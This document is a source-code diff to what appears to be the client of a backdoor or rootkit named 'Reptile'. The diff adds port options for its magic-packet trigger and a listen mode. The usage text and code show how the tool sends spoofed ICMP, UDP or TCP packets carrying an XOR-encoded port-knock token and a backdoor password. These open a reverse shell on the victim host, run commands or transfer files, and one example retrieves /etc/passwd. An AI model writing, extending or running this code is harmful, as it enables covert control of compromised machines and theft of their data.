@@ -314,7 +314,7 @@ int runshell(int server, char *argv2) {
 
         if(select(server + 1, &rd, NULL, NULL, NULL) < 0) {
             p_error("select");
-            ret = 28;
+            ret = ERROR;
             break;
         }
 
@@ -326,14 +326,14 @@ int runshell(int server, char *argv2) {
                     ret = 0;
                 } else {
                     pel_error("pel_recv_msg");
-                    ret = 29;
+                    ret = ERROR;
                 }
                 break;
             }
 
             if(write(1, message, len) != len) {
                 p_error("write");
-                ret = 30;
+                ret = ERROR;
                 break;
             }
         }
@@ -343,13 +343,13 @@ int runshell(int server, char *argv2) {
 
             if(len == 0) {
                 fprintf(stderr, "stdin: end-of-file\n");
-                ret = 31;
+                ret = 0;
                 break;
             }
 
             if(len < 0) {
                 p_error("read");
-                ret = 32;
+                ret = ERROR;
                 break;
             }
 
@@ -357,7 +357,7 @@ int runshell(int server, char *argv2) {
 
             if(ret != PEL_SUCCESS) {
                 pel_error("pel_send_msg");
-                ret = 33;
+                ret = ERROR;
                 break;
             }
         }
@@ -560,32 +560,36 @@ void usage(char *argv){
 	printf("\nUsage: %s [options]\n\n", argv);
 	printf("-t Target\n");
 	printf("-a Action:\n\n");
-	printf(" <cmd>                       \trun command\n");
-	printf(" get <source-file> <dest-dir>\tdownload a file\n");
-	printf(" put <source-file> <dest-dir>\tupload a file\n\n");
+	printf("  \t<cmd>                       \trun command\n");
+	printf("  \tget <source-file> <dest-dir>\tdownload a file\n");
+	printf("  \tput <source-file> <dest-dir>\tupload a file\n\n");
 	printf("%s If action is nothing specified, open a shell!\n\n", warn);
 	printf("-x\tMagic Packet protocol (ICMP/UDP/TCP) or just \"listen\"\n");
 	printf("-s\tSource IP address if you wanna spoof\n");
 	printf("-l\tLocal host to reverse shell\n");
 	printf("-p\tLocal port to reverse shell\n");
+	printf("-q\tSource port from magic packets. Default: 666\n");
+	printf("-r\tRemote port from magic packets. Default: TCP:80 | UDP:53\n");
 	printf("-k\tToken to trigger the port-knocking\n");
 	printf("-w\tPassword for backdoor auth\n\n");
 	printf("%s ICMP doesn't need ports\n\n", warn);
-	printf("Example: %s -t 192.168.0.3 -x tcp -s 192.168.0.2 -l 192.168.0.4 -p 4444 -w s3cr3t -k hax0r\n", argv);
+	printf("Example: %s -t 192.168.0.3 -x tcp -l 192.168.0.4 -p 4444\n", argv);
+	printf("Example: %s -t 192.168.0.3 -x udp -l 192.168.0.4 -p 4444 -r 161 -q 8888\n", argv);
+	printf("Example: %s -t 192.168.0.3 -x icmp -s 192.168.0.2 -l 192.168.0.4 -p 4444 -w s3cr3t -k hax0r\n", argv);
 	printf("Example: %s -t 192.168.0.3 -a \"get /etc/passwd /tmp\" -x udp -l 192.168.0.4 -p 4444\"\n\n", argv);
 	exit(1);
 }
 
 int main(int argc, char **argv) {
-        char *srcip, *dstip, *buf, *prot, *lport, *lhost, *data; 
+        char *srcip, *dstip, *buf, *prot, *lport, *lhost, *data;
 	char *password, *src_file, *dst_dir, *cmd, action = RUNSHELL; 
-        int opt, ret, new_sockfd, yes = 1;  
+        int opt, ret, new_sockfd, yes = 1, rport = 0, srcport = SRCPORT;  
 	struct sockaddr_in host_addr, client_addr;
 	socklen_t sin_size;
 
         lhost = lport = src_file = dst_dir = srcip = dstip = prot = buf = cmd = data = NULL;
  
-        while((opt = getopt(argc, argv, "a:s:t:l:p:x:w:k:")) != EOF) {
+        while((opt = getopt(argc, argv, "x:t:l:p:r:s:q:a:w:k:")) != EOF) {
                 switch(opt) {
                         case 'x':
                                 prot = optarg;
@@ -599,13 +603,6 @@ int main(int argc, char **argv) {
 						}
 					}
 				}
-                                break;
-                        case 's':
-                                if(strlen(optarg) > 15) {
-                                        printf("%s wrong IP address\n", bad);
-                                        exit(-1);
-                                }
-                                srcip = optarg; 
                                 break;
 			case 't':
                                 if(strlen(optarg) > 15) {
@@ -627,6 +624,27 @@ int main(int argc, char **argv) {
 					exit(-1);
 				}
 				lport = optarg;
+				break;
+			case 'r':
+				if(atoi(optarg) < 0 || atoi(optarg) > 65535){
+                                        printf("%s wrong port\n", bad);
+					exit(-1);
+				}
+				rport = atoi(optarg);
+				break;
+                        case 's':
+                                if(strlen(optarg) > 15) {
+                                        printf("%s wrong IP address\n", bad);
+                                        exit(-1);
+                                }
+                                srcip = optarg; 
+                                break;
+			case 'q':
+				if(atoi(optarg) < 0 || atoi(optarg) > 65535){
+                                        printf("%s wrong port\n", bad);
+					exit(-1);
+				}
+				srcport = atoi(optarg);
 				break;
 			case 'a':
     				if(strstr(optarg, "get") != NULL) {
@@ -654,14 +672,22 @@ int main(int argc, char **argv) {
                                 break;
                 }
         }
-    	argv+=(optind-1);
-   	argc-=(optind-1);
-
+	
 	password = NULL;
-    	
-	if(lport == NULL || lhost == NULL || dstip == NULL || prot == NULL) usage(argv[0]);
-	if(srcip == NULL) srcip = strdup(lhost);
 
+    	if(prot == NULL) usage(argv[0]);
+
+	if(!strcmp(prot, "listen")) {
+		if(lport == NULL) usage(argv[0]);
+	} else {
+		if(lport == NULL || lhost == NULL || dstip == NULL) usage(argv[0]);
+		if(srcip == NULL) srcip = strdup(lhost);
+		if(rport == 0) {
+        		if(!strcmp(prot, "udp")) rport = UDPPORT;
+        		if(!strcmp(prot, "tcp")) rport = TCPPORT;
+		}
+	}
+	
 	system("clear");
 	printf("\n\e[01;36mReptile Client\e[00m\n");
 	printf("\e[01;32mWritten by: F0rb1dd3n\e[00m\n\n");
@@ -676,9 +702,9 @@ int main(int argc, char **argv) {
 		strcat(data, lport);
 		strcat(data, " ");
 
-		printf("%s Data: %s\n", good, data);
+		//printf("%s Data: %s\n", good, data);
 		s_xor(data, 11, strlen(data));
-		printf("%s Encoded data: %s\n", good, data);		
+		//printf("%s Encoded data: %s\n", good, data);		
         
 		if(action == GET_FILE) printf("%s Download %s -> %s\n", good, src_file, dst_dir);
         	if(action == PUT_FILE) printf("%s Upload %s -> %s\n", good, src_file, dst_dir);
@@ -719,7 +745,7 @@ int main(int argc, char **argv) {
 		if(new_sockfd == -1) fatal("accepting connection");
 
 		fprintf(stdout, "%s Connection from %s:%d\n", good, inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
-		kill(pid, SIGQUIT); // telling child to stop sending packets, cause we received the fucking connection
+		kill(pid, SIGQUIT);
 		usleep(100*1500);
 
 		if(password == NULL) {
@@ -777,9 +803,9 @@ int main(int argc, char **argv) {
         		if(!strcmp(prot, "icmp")) {
 				icmp(srcip, dstip, data);
         		} else if(!strcmp(prot, "udp")) {
-                		udp(srcip, dstip, SRCPORT, UDPPORT, data);
+                		udp(srcip, dstip, srcport, rport, data);
         		} else if(!strcmp(prot, "tcp")) {
-                		tcp(srcip, dstip, SRCPORT, TCPPORT, data);
+                		tcp(srcip, dstip, srcport, rport, data);
         		}
 			sleep(1);
 			printf("%s Retry in 1 second...\n", warn);
